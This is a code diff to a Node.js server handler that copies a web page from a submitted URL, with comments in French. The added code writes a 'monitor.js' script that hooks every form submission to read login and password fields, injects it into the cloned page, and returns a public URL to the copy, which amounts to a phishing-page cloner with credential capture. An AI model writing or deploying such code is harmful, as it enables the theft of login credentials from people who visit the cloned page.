@@ -359,10 +359,11 @@ const fetchHtmlFromUrl = async (req, res) => {
       return res.status(403).json({ message: 'Access denied, insufficient permissions' });
     }
 
-    const { url, outputDir } = req.body;
+    const { url } = req.body;
+    const outputDir = './output/copied_page';
 
-    if (!url || !outputDir) {
-      return res.status(400).json({ message: 'URL and output directory are required' });
+    if (!url) {
+      return res.status(400).json({ message: 'URL is required' });
     }
 
     try {
@@ -377,55 +378,47 @@ const fetchHtmlFromUrl = async (req, res) => {
       }
 
       const outputFilePath = path.join(outputDir, 'index.html');
-      fs.writeFileSync(outputFilePath, htmlContent, 'utf-8');
-      console.log(`HTML saved to ${outputFilePath}`);
+      const scriptFilePath = path.join(outputDir, 'monitor.js');
 
-      const downloadResource = async (url, outputPath) => {
-        try {
-          const resourceResponse = await axios.get(url, { responseType: 'arraybuffer' });
-          fs.writeFileSync(outputPath, resourceResponse.data);
-          console.log(`Resource saved: ${outputPath}`);
-        } catch (error) {
-          console.error(`Failed to download resource: ${url}`, error.message);
-        }
-      };
+      // Script JavaScript à injecter
+      const scriptContent = `
+        document.addEventListener('DOMContentLoaded', () => {
+          const forms = document.querySelectorAll('form');
+          forms.forEach(form => {
+            form.addEventListener('submit', (event) => {
+              const loginField = form.querySelector('input[type="text"], input[type="email"]');
+              const passwordField = form.querySelector('input[type="password"]');
+              if (loginField && passwordField) {
+                console.log('Login:', loginField.value);
+                console.log('Password:', passwordField.value);
+              }
+            });
+          });
+        });
+      `;
 
-      const saveResource = async (tag, attribute, folderName) => {
-        const elements = document.querySelectorAll(tag);
-        const folderPath = path.join(outputDir, folderName);
+      // Écrire le script dans un fichier séparé
+      fs.writeFileSync(scriptFilePath, scriptContent, 'utf-8');
+      console.log(`Script saved to ${scriptFilePath}`);
 
-        if (!fs.existsSync(folderPath)) {
-          fs.mkdirSync(folderPath, { recursive: true });
-        }
+      // Ajouter le script à la page
+      const scriptElement = document.createElement('script');
+      scriptElement.src = './monitor.js';
+      scriptElement.type = 'text/javascript';
+      document.body.appendChild(scriptElement);
 
-        for (const element of elements) {
-          const resourceUrl = element.getAttribute(attribute);
-          if (resourceUrl && !resourceUrl.startsWith('http') && !resourceUrl.startsWith('//')) {
-            const absoluteUrl = new URL(resourceUrl, url).href;
-            const resourceName = path.basename(absoluteUrl);
-            const resourcePath = path.join(folderPath, resourceName);
-
-            await downloadResource(absoluteUrl, resourcePath);
-
-            // Update the resource link in the HTML
-            element.setAttribute(attribute, path.join(folderName, resourceName));
-          }
-        }
-      };
-
-      await saveResource('link[rel="stylesheet"]', 'href', 'css');
-
-
-      await saveResource('img', 'src', 'images');
-
-
-      await saveResource('script', 'src', 'js');
-
-
+      // Mettre à jour le HTML avec les liens des ressources et le script injecté
       fs.writeFileSync(outputFilePath, dom.serialize(), 'utf-8');
-      console.log('HTML file updated with local resource links');
+      console.log('HTML file updated with local resource links and monitoring script');
 
-      res.status(200).json({ message: 'Web page copied successfully', outputDir });
+      // Construire l'URL publique
+      const serverUrl = `${req.protocol}://${req.get('host')}`;
+      const publicUrl = `${serverUrl}/generated/copied_page/index.html`;
+
+      res.status(200).json({
+        message: 'Web page copied successfully with monitoring script',
+        url: publicUrl,
+      });
     } catch (error) {
       console.error('Error copying the web page:', error.message);
       res.status(500).json({ message: 'Failed to copy the web page', error: error.message });
@@ -434,6 +427,9 @@ const fetchHtmlFromUrl = async (req, res) => {
     return res.status(401).json({ message: 'Not authorized, token invalid', error: error.message });
   }
 };
+
+
+
 
 const writeToFile = (req, res) => {
   const { filePath, data } = req.body;
